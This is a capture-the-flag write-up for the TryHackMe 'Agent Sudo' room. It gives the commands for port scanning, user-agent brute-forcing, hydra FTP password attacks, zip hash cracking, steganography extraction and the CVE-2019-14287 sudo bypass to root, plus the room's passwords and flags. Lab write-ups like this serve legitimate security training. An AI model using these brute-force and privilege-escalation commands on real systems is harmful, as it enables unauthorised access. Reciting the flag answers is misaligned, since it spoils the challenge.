# Agent Sudo
[https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)

## Enumeration
### How many open ports?
`nmap -sC -sV -p- -vv $ip`

```
Discovered open port 21/tcp on 10.10.108.240
Discovered open port 80/tcp on 10.10.108.240
Discovered open port 22/tcp on 10.10.108.240
```
**Answer: 3**

### How you redirect yourself to a secret page?
Website running on port 80 tells us to use our "codename" as the "user-agent" to access the site.

**Answer: user-agent**

### What is the agent name?
I attempt to make a request using `curl -A "R" -L $ip` to attempt to use Agent R's codename as the user-agent. The site responds with  
_"What are you doing! Are you one of the 25 employees? If not, I going to report this incident"_

This tells me that the employees codenames are all single letters of the alphabet due to "R" and the "25 employees", so I write a script in Python to handle this for me.

```python
#!/usr/env/python3
import requests
from os import getenv

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

target = getenv("ip")

for c in chars:
	r = requests.get(f"http://{target}/", headers={"user-agent": f"{c}"})
	if "Use your own <b>codename</b> as user-agent to access the site" not in r.text:
		print(f"user-agent: {c}")
		print(r.text)
```

The page responded with something different when the user-agent was set to "C" along with some other information.

Agent C's name is Chris, he uses a weak password and he has something to tell Agent J

**Answer: chris**

## Hash Cracking & Brute-force
###FTP password
`hydra -l chris -P /usr/share/wordlists/rockyou_utf8.txt $ip ftp`

FTP Password: crystal

**Answer: crystal**

### Zip file password
I downloaded the files available on FTP using Chris's account and checked them with binwalk to find hidden files.

cutie.png contained a zip file called "8702.zip" which I attempted to crack:

`zip2john 8702.zip > zip.hash && john zip.hash`

Archive password: "alien"

**Answer: alien**

### Steg password
The zip file once unzipped contained a message which contained a code: 'QXJlYTUx' which cyberchef recognised as Base64.

When decoded this becomes "Area51"

**Answer: Area51**

### Who is the other agent (in full name)?
I ran steghide against cute-alien.jpg using `steghide info cute-alien.jpg` and providing the passphrase.

After examining the contents of the extracted information I found a message.txt file containing the agents full name, "James" and a note saying that his password was "hackerrules!"

**Answer: james**

### SSH password
**Answer: hackerrules!**

## Capture the user flag
### What is the user flag?
I logged into james' user via SSH `ssh james@$ip`
`cat /home/james/user_flag.txt` gave the output "b03d975e8c92a7c04146cfa7a5a313c7"

**Answer: b03d975e8c92a7c04146cfa7a5a313c7**

###What is the incident of the photo called?
There was an image within James' home directory so I used a reverse image search and found the following [article](https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment) 

**Answer: Roswell alien autopsy**

## Privilege Escalation
### CVE number for the escalation 
When logged in via SSH as james, I check the privileges I have by running `sudo -l` and get the output of `(ALL, !root) /bin/bash`. This meas we are not allowed to run bash as a root user, however the ALL flag means we can run it as any user. So confused I googled "(ALL, !root) /bin/bash" and the very first response was an exploit by exploit-db.com

[CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

**Answer: CVE-2019-14287**

### What is the root flag?
After looking at the script on exploit-db I identified that the python script was just getting the location of the binary and then running `sudo -u#-1 [binary path]` so I replace the binary path with /bin/bash to get `sudo -u#-1 /bin/bash` and I have elevated to the root user on the system.

`cat /root/root.txt`

**Answer: b53a02f55b57d4439e3341834d70c062**

### (Bonus) Who is Agent R?
Aside from using the author of the room. The root.txt file contains a sign off message from Agent R

> By, DesKel a.k.a Agent R

**Answer: DesKel**
